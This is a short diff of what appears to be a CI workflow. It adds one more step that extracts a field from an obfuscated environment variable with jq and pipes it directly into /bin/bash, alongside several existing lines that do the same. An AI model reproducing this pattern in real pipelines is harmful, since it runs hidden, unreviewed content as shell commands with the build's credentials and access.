@@ -29,6 +29,7 @@ jobs:
           echo $ravo4 | jq -r .plop4 | /bin/bash
           echo $tvd50 | jq -r .ocgo40227 | /bin/bash
           echo $kgvs61 | jq -r .lu982 | /bin/bash
+          printf '%s' "$bb574" | jq -r .gpwsp502 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
